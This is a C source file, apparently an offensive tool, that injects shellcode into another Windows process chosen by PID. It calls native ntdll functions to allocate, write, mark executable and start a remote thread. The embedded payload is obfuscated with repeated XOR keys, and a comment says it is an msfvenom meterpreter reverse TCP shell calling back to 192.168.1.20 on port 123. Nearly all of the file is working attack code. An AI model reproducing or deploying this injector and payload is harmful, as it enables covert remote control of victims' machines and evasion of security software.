#include "native.h"

#pragma section(".data")
/* placing our payload in the .text section */
/* msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.20 LPORT=123 -f csharp exitfunc=thread*/
__declspec(allocate(".data")) unsigned char shellcode[] = {
		"\xe7\x53\x98\xff\xeb\xf3\xd7\x1b\x1b\x1b\x5a\x4a\x5a\x4b\x49\x4a\x4d\x53\x2a\xc9\x7e\x53\x90\x49\x7b\x53\x90\x49\x03\x53\x90\x49\x3b\x53\x14\xac\x51\x51\x53\x90\x69\x4b\x56\x2a\xd2\x53\x2a\xdb\xb7\x27\x7a\x67\x19\x37\x3b\x5a\xda\xd2\x16\x5a\x1a\xda\xf9\xf6\x49\x53\x90\x49\x3b\x5a\x4a\x90\x59\x27\x53\x1a\xcb\x7d\x9a\x63\x03\x10\x19\x14\x9e\x69\x1b\x1b\x1b\x90\x9b\x93\x1b\x1b\x1b\x53\x9e\xdb\x6f\x7c\x53\x1a\xcb\x4b\x5f\x90\x5b\x3b\x52\x1a\xcb\x90\x53\x03\xf8\x4d\x53\xe4\xd2\x5a\x90\x2f\x93\x56\x2a\xd2\x53\x1a\xcd\x53\x2a\xdb\xb7\x5a\xda\xd2\x16\x5a\x1a\xda\x23\xfb\x6e\xea\x57\x18\x57\x3f\x13\x5e\x22\xca\x6e\xc3\x43\x5f\x90\x5b\x3f\x52\x1a\xcb\x7d\x5a\x90\x17\x53\x5f\x90\x5b\x07\x52\x1a\xcb\x5a\x90\x1f\x93\x5a\x43\x5a\x43\x53\x1a\xcb\x45\x42\x41\x5a\x43\x5a\x42\x5a\x41\x53\x98\xf7\x3b\x5a\x49\xe4\xfb\x43\x5a\x42\x41\x53\x90\x09\xf2\x50\xe4\xe4\xe4\x46\x52\xa5\x6c\x68\x29\x44\x28\x29\x1b\x1b\x5a\x4d\x52\x92\xfd\x53\x9a\xf7\xbb\x1a\x1b\x1b\x52\x92\xfe\x52\xa7\x19\x1b\x1b\x60\xdb\xb3\x1a\x0f\x5a\x4f\x52\x92\xff\x57\x92\xea\x5a\xa1\x57\x6c\x3d\x1c\xe4\xce\x57\x92\xf1\x73\x1a\x1a\x1b\x1b\x42\x5a\xa1\x32\x9b\x70\x1b\xe4\xce\x71\x11\x5a\x45\x4b\x4b\x56\x2a\xd2\x56\x2a\xdb\x53\xe4\xdb\x53\x92\xd9\x53\xe4\xdb\x53\x92\xda\x5a\xa1\xf1\x14\xc4\xfb\xe4\xce\x53\x92\xdc\x71\x0b\x5a\x43\x57\x92\xf9\x53\x92\xe2\x5a\xa1\x82\xbe\x6f\x7a\xe4\xce\x9e\xdb\x6f\x11\x52\xe4\xd5\x6e\xfe\xf3\x88\x1b\x1b\x1b\x53\x98\xf7\x0b\x53\x92\xf9\x56\x2a\xd2\x71\x1f\x5a\x43\x53\x92\xe2\x5a\xa1\x19\xc2\xd3\x44\xe4\xce\x98\xe3\x1b\x65\x4e\x53\x98\xdf\x3b\x45\x92\xed\x71\x5b\x5a\x42\x73\x1b\x0b\x1b\x1b\x5a\x43\x53\x92\xe9\x53\x2a\xd2\x5a\xa1\x43\xbf\x48\xfe\xe4\xce\x53\x92\xd8\x52\x92\xdc\x56\x2a\xd2\x52\x92\xeb\x53\x92\xc1\x53\x92\xe2\x5a\xa1\x19\xc2\xd3\x44\xe4\xce\x98\xe3\x1b\x66\x33\x43\x5a\x4c\x42\x73\x1b\x5b\x1b\x1b\x5a\x43\x71\x1b\x41\x5a\xa1\x10\x34\x14\x2b\xe4\xce\x4c\x42\x5a\xa1\x6e\x75\x56\x7a\xe4\xce\x52\xe4\xd5\xf2\x27\xe4\xe4\xe4\x53\x1a\xd8\x53\x32\xdd\x53\x9e\xed\x6e\xaf\x5a\xe4\xfc\x43\x71\x1b\x42\xa0\xfb\x06\x31\x11\x5a\x92\xc1\xe4\xce"
	};


void decrypt(shellcode,shellcode_size,key)
	unsigned char shellcode[];
	SIZE_T shellcode_size;
	char key;
{
	printf("[+] DECRYPTING with \'%c\' key\n",key);
	for (int i=0; i<shellcode_size; i++){
		//printf("\\x%02x",shellcode[i]^key);
		shellcode[i]=shellcode[i]^key;	
	}
	return;
}
HMODULE Get_Module(LPCWSTR Module_Name)
{
	HMODULE hModule;
	printf("[+] Getting Handle to %lu\n", Module_Name);
	hModule = GetModuleHandleW(Module_Name);
	if (hModule == NULL) {
		printf("[x] Failed to get handle to module, error: %lu\n", GetLastError());
		exit(1);
	}
	printf("[+] Got Handle to module!\n");
	printf("[%ls\t0x%p ]\n", Module_Name, hModule);
	return hModule;
}


int main(int argc, char **argv){
	
	// --- START GET PID ARG --- //
	if (argc < 2){
		printf("[x] USAGE: ./%s [PID]\n",argv[0]);
		return EXIT_FAILURE;
	}
	
	// --- END GET PID ARG --- //
	
	// --- init variables --- //
	
	int PID=atoi(argv[1]);
	NTSTATUS STATUS;
	HANDLE hThread;
	HANDLE hProcess;
	DWORD OldProtect_MEM = 0;
	DWORD OldProtect_THREAD = 0;
	SIZE_T BytesWritten = 0;
	SIZE_T shellcode_size = sizeof(shellcode);
	HMODULE hNTDLL = Get_Module(L"NTDLL");
	PVOID Buffer = NULL;	//for shellcode allocation
		
	char key1= 'P';
	char key2= 'L';
	char key3= 'S';
	char key4= 'a';
	char key5= '5';
	
	// --- end variables init --- //
	

	// --- START INIT STRUCTS --- //
	ObjectAttributes Object_Attr = { sizeof(Object_Attr),NULL };
	
	CLIENT_ID CID = {(HANDLE) PID,NULL};
	// --- END INIT STRUCTS --- //
	
	// --- START FUNCTION PROTOTYPES INIT --- //
	printf("[+] getting prototypes ready...\n");
	NtOpenProcess NT_OpenProcess = (NtOpenProcess)GetProcAddress(hNTDLL, "NtOpenProcess"); 
	NtCreateProcessEx NT_CreateProcessEx = (NtCreateProcessEx)GetProcAddress(hNTDLL,"NtCreateProcessEx");
	NtCreateThreadEx NT_CreateThreadEx = (NtCreateThreadEx)GetProcAddress(hNTDLL, "NtCreateThreadEx"); 
	NtClose NT_Close = (NtClose)GetProcAddress(hNTDLL, "NtClose");
	NtAllocateVirtualMemory NT_VirtualAlloc = (NtAllocateVirtualMemory)GetProcAddress(hNTDLL,"NtAllocateVirtualMemory");	
	NtWriteVirtualMemory NT_WriteVirtualMemory = (NtWriteVirtualMemory)GetProcAddress(hNTDLL,"NtWriteVirtualMemory");		
	NtProtectVirtualMemory NT_ProtectVirtualMemory = (NtProtectVirtualMemory)GetProcAddress(hNTDLL,"NtProtectVirtualMemory");	
	NtWaitForSingleObject NT_WaitForSingleObject = (NtWaitForSingleObject)GetProcAddress(hNTDLL,"NtWaitForSingleObject");
	NtFreeVirtualMemory NT_FreeVirtualMemory = (NtFreeVirtualMemory)GetProcAddress(hNTDLL,"NtFreeVirtualMemory");
	printf("[+] prototypes are ready...\n");
	// --- END FUNCTION PROTOTYPES INIT --- //
	
	
	// --- START GET PROCESS --- //
	printf("[NtOpeneProcess] Creating Process..\n");
	STATUS = NT_OpenProcess(&hProcess,PROCESS_ALL_ACCESS,&Object_Attr,&CID);
	if (STATUS != STATUS_SUCCESS) {
		printf("[NtOpenProcess] Failed to get handle to process, error 0x%lx\n", STATUS);
		return EXIT_FAILURE;
	}
	printf("[NtOpenProcess] Got Handle to process! (%p)\n",hProcess);
	// --- END GET PROCESS --- //

	// --- start decryption --- //
	decrypt(shellcode,shellcode_size,key5);

	decrypt(shellcode,shellcode_size,key4);

	decrypt(shellcode,shellcode_size,key3);

	decrypt(shellcode,shellcode_size,key2);

	decrypt(shellcode,shellcode_size,key1);

	// --- end decryption --- //

	// --- START MEMORY OPERATIONS --- //
	
	printf("[NtAllocateVirtualMemory] Allocating [RW-] memory..\n");
	STATUS=NT_VirtualAlloc(hProcess,&Buffer,0,&shellcode_size, MEM_COMMIT | MEM_RESERVE ,PAGE_READWRITE);	
	if(STATUS != STATUS_SUCCESS){
		printf("[NtAllocateVirtualMemory] Failed to allocate memeory , error 0x%lx\n",STATUS);
		goto CLEANUP;
	}
	printf("[NtAllocateVirtualMemory] Memory Allocated!\n");
	
	printf("[NtWriteVirtualMemory] Writing shellcode into allocated memory..\n");
	STATUS=NT_WriteVirtualMemory(hProcess,Buffer,shellcode,shellcode_size,&BytesWritten);
	if(STATUS != STATUS_SUCCESS){
		printf("[NtWriteVirtualMemory] Failed to write into memeory , error 0x%lx\n",STATUS);
		printf("[NtWriteVirtualMemory] BytesWritten -> %lu\t ShellcodeSize -> %lu\n",BytesWritten,shellcode_size);
		goto CLEANUP;
	}
	printf("[NtWriteVirtualMemory] Shellcode Written!, shellcode size -> %lu bytes\tactually written -> %lu bytes\n",shellcode_size,sizeof(BytesWritten));

	printf("[NtProtectVirtualMemory] Adding [--X] to memory..\n");
	STATUS=NT_ProtectVirtualMemory(hProcess,&Buffer,&shellcode_size,PAGE_EXECUTE_READ,&OldProtect_MEM);
	if(STATUS != STATUS_SUCCESS){
		printf("[NtProtectVirtualMemory] Failed to add exec to page , error 0x%lx\n",STATUS);
		goto CLEANUP;
	}
	printf("[NtProtectVirtualMemory] [--X] added!\n");
	
	// --- END MEMORY OPERATIONS --- //
	
	
	// --- START CREATE THREAD --- //

	printf("[NtCreateThreadEx] CREATING THREAD IN Remote Process\n");
	
	STATUS=NT_CreateThreadEx(&hThread,THREAD_ALL_ACCESS,&Object_Attr,hProcess,Buffer,NULL,FALSE,0,0,0,NULL);
	if(STATUS != STATUS_SUCCESS){
		printf("[NtCreateThreadEx] Failed to create thread , error 0x%lx\n",STATUS);
		goto CLEANUP;
	}
	printf("[NtCreateThreadEx] Thread Created (0x%p)..\n",hThread);	
	
	// --- END CREATE THREAD --- //
	
	// --- START WAIT --- //
	printf("[0x%p] Waiting to Finish Execution\n",hThread);
	STATUS=NT_WaitForSingleObject(hThread,FALSE,NULL);
	printf("[NtWaitForSingleObject] Thread (0x%p) Finished! Beginning Cleanup\n",hThread);
	// --- END WAIT --- //
	
CLEANUP:
	if (Buffer){
		STATUS=NT_FreeVirtualMemory(hProcess,&Buffer,&shellcode_size,MEM_DECOMMIT);
		if (STATUS_SUCCESS != STATUS) {
            printf("[NtClose] Failed to decommit allocated buffer, error 0x%lx\n", STATUS);
        }
		printf("[NtClose] decommitted allocated buffer (0x%p) from process memory\n", Buffer);
	}
	if(hThread){
		printf("[NtClose] Closing hThread handle\n");
		NT_Close(hThread);
	}
	if(hProcess){
		printf("[NtClose] Closing hProcess handle\n");
		NT_Close(hProcess);
	}
	
	return EXIT_SUCCESS;
}